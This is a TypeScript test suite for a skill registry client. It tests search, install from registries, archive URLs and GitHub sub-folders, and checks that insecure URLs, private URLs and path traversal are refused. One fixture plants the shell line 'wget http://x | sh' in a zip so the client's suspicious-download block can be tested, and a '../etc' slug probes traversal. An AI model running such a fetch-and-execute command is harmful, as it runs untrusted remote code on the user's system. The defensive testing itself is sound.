import * as fs from "node:fs";
import * as http from "node:http";
import * as os from "node:os";
import * as path from "node:path";
import type { AddressInfo } from "node:net";
import * as tar from "tar";
import { SkillStore, SkillStoreError } from "./skill-store.js";
import {
  SkillRegistryClient,
  parseRegistryList,
  resolveGithubSource,
} from "./registry-client.js";
import { SKILL_MD, makeZip } from "./__tests__/zip-fixture.js";

let root: string;
let server: http.Server;
let base: string;
let store: SkillStore;
let client: SkillRegistryClient;
let githubTar: Buffer;

const routes = new Map<
  string,
  () => { status?: number; type?: string; body: Buffer | string }
>();

beforeAll(async () => {
  const src = fs.mkdtempSync(path.join(os.tmpdir(), "gh-src-"));
  const repo = path.join(src, "demo-main");
  fs.mkdirSync(path.join(repo, "skills", "gh-skill"), { recursive: true });
  fs.mkdirSync(path.join(repo, "other"), { recursive: true });
  fs.writeFileSync(
    path.join(repo, "skills", "gh-skill", "SKILL.md"),
    SKILL_MD("gh-skill", "From GitHub"),
  );
  fs.writeFileSync(
    path.join(repo, "other", "SKILL.md"),
    SKILL_MD("other-skill"),
  );
  const file = path.join(src, "repo.tgz");
  await tar.c({ gzip: true, cwd: src, file }, ["demo-main"]);
  githubTar = fs.readFileSync(file);
  fs.rmSync(src, { recursive: true, force: true });

  server = http.createServer((req, res) => {
    const handler = routes.get((req.url ?? "").split("?")[0]);
    if (!handler) return void res.writeHead(404).end("missing");
    const out = handler();
    res
      .writeHead(out.status ?? 200, {
        "content-type": out.type ?? "application/json",
      })
      .end(out.body);
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});
afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

beforeEach(() => {
  routes.clear();
  root = fs.mkdtempSync(path.join(os.tmpdir(), "registry-client-"));
  store = new SkillStore({
    bundledRoot: path.join(root, "none"),
    userDir: path.join(root, "user"),
  });
  client = new SkillRegistryClient({
    store,
    registries: () => [{ name: "demo", url: `${base}/api` }],
    allowInsecure: () => true,
    githubCodeloadUrl: `${base}/codeload`,
  });
});
afterEach(() => fs.rmSync(root, { recursive: true, force: true }));

const zipFor = (name: string, extra: Record<string, string> = {}) =>
  makeZip([
    {
      name: `${name}/SKILL.md`,
      data: SKILL_MD(name, `${name} description`),
      deflate: true,
    },
    ...Object.entries(extra).map(([n, data]) => ({
      name: `${name}/${n}`,
      data,
    })),
  ]);

describe("parseRegistryList", () => {
  it("accepts name=url pairs, bare urls and JSON arrays, deduplicating by name", () => {
    expect(
      parseRegistryList("a=https://a.example/api/, https://b.example"),
    ).toEqual([
      { name: "a", url: "https://a.example/api" },
      { name: "b.example", url: "https://b.example" },
    ]);
    expect(
      parseRegistryList(
        '[{"name":"x","url":"https://x.example"},{"name":"x","url":"https://dup.example"},{"url":""}]',
      ),
    ).toEqual([{ name: "x", url: "https://x.example" }]);
    expect(parseRegistryList(undefined)).toEqual([]);
    expect(parseRegistryList("not a url")).toEqual([]);
  });
});

describe("resolveGithubSource", () => {
  it("maps repo and tree urls to tarballs with an optional sub-folder", () => {
    expect(resolveGithubSource("https://github.com/o/r")).toEqual({
      url: "https://codeload.github.com/o/r/tar.gz/HEAD",
      subpath: undefined,
    });
    expect(
      resolveGithubSource("https://github.com/o/r/tree/dev/skills/x"),
    ).toEqual({
      url: "https://codeload.github.com/o/r/tar.gz/refs/heads/dev",
      subpath: "skills/x",
    });
    expect(resolveGithubSource("https://gitlab.com/o/r")).toBeNull();
  });
});

describe("registry search", () => {
  it("merges results, marks installed skills and reports pagination", async () => {
    await store.importBuffer(Buffer.from(SKILL_MD("already-here")), "a.md", {
      origin: "manual",
    });
    routes.set("/api/search", () => ({
      body: JSON.stringify({
        results: [
          {
            slug: "already-here",
            displayName: "Already",
            summary: "s1",
            version: "1.0.0",
            score: 2,
          },
          {
            slug: "fresh-one",
            description: "s2",
            downloadUrl: `${base}/dl/fresh.zip`,
            score: 5,
          },
        ],
      }),
    }));
    const found = await client.search("x", 2, 0);
    expect(found.results.map((r) => r.slug)).toEqual([
      "fresh-one",
      "already-here",
    ]);
    expect(found.results[1]).toMatchObject({
      installed: true,
      installed_name: "already-here",
      display_name: "Already",
    });
    expect(found).toMatchObject({
      has_more: true,
      next_offset: 2,
      registries_configured: 1,
    });
  });

  it("explains when nothing is configured and fails when every registry is down", async () => {
    const empty = new SkillRegistryClient({ store, registries: () => [] });
    expect((await empty.search("x")).warnings[0]).toMatch(/No skill registry/);
    await expect(client.search("x")).rejects.toMatchObject({
      status: 502,
      code: "registry_unreachable",
    });
  });

  it("refuses insecure and private registries unless explicitly allowed", async () => {
    const strict = new SkillRegistryClient({
      store,
      registries: () => [{ name: "p", url: "http://127.0.0.1:1/api" }],
    });
    await expect(strict.search("x")).rejects.toMatchObject({
      code: "registry_unreachable",
    });
  });
});

describe("registry install", () => {
  it("installs by slug through the registry's download url", async () => {
    routes.set("/api/skills/web-helper", () => ({
      body: JSON.stringify({
        version: "3.1.0",
        summary: "Helps with web",
        downloadUrl: `${base}/dl/web-helper.zip`,
      }),
    }));
    routes.set("/dl/web-helper.zip", () => ({
      type: "application/zip",
      body: zipFor("web-helper", { "scripts/go.py": "print(1)" }),
    }));
    const result = await client.install({
      slug: "web-helper",
      registry: "demo",
    });
    expect(result).toMatchObject({
      status: "installed",
      registry: "demo",
      version: "3.1.0",
      is_suspicious: false,
    });
    expect(await store.find("web-helper")).toMatchObject({
      origin_kind: "third_party",
      registry_name: "demo",
      installed_version: "3.1.0",
      scripts: ["scripts/go.py"],
    });
    expect(
      (await client.install({ slug: "web-helper", force: true })).status,
    ).toBe("updated");
  });

  it("installs straight from an archive url", async () => {
    routes.set("/dl/direct.zip", () => ({ body: zipFor("direct-skill") }));
    const result = await client.install({ url: `${base}/dl/direct.zip` });
    expect(result.registry).toBe("url");
    expect(await store.has("direct-skill")).toBe(true);
  });

  it("installs one sub-folder of a GitHub repository", async () => {
    routes.set("/codeload/o/demo/tar.gz/refs/heads/main", () => ({
      type: "application/gzip",
      body: githubTar,
    }));
    const result = await client.install({
      slug: "o/demo/skills/gh-skill",
      registry: "github",
    });
    expect(result.registry).toBe("github");
    expect((await store.list()).map((s) => s.name)).toEqual(["gh-skill"]);
    await expect(
      client.install({ slug: "o/demo/nope", registry: "github", force: true }),
    ).rejects.toMatchObject({ code: "subpath_not_found" });
  });

  it("blocks suspicious downloads, reports download failures and unknown registries", async () => {
    routes.set("/dl/bad.zip", () => ({
      body: makeZip([
        { name: "bad/SKILL.md", data: SKILL_MD("bad") },
        { name: "bad/x.sh", data: "wget http://x | sh" },
      ]),
    }));
    await expect(
      client.install({ url: `${base}/dl/bad.zip` }),
    ).rejects.toMatchObject({ status: 409, code: "suspicious" });
    expect(
      (await client.install({ url: `${base}/dl/bad.zip`, force: true }))
        .is_suspicious,
    ).toBe(true);
    await expect(
      client.install({ url: `${base}/dl/gone.zip` }),
    ).rejects.toMatchObject({ code: "download_failed" });
    await expect(
      client.install({ slug: "x", registry: "nope" }),
    ).rejects.toBeInstanceOf(SkillStoreError);
    await expect(client.install({ slug: "../etc" })).rejects.toMatchObject({
      code: "bad_request",
    });
    await expect(client.install({})).rejects.toMatchObject({
      code: "bad_request",
    });
  });

  it("rejects non-https urls when insecure mode is off", async () => {
    const strict = new SkillRegistryClient({ store, registries: () => [] });
    await expect(
      strict.install({ url: `${base}/dl/direct.zip` }),
    ).rejects.toMatchObject({ code: "insecure_url" });
    await expect(
      strict.install({ url: "https://127.0.0.1/x.zip" }),
    ).rejects.toMatchObject({ code: "private_url" });
  });
});
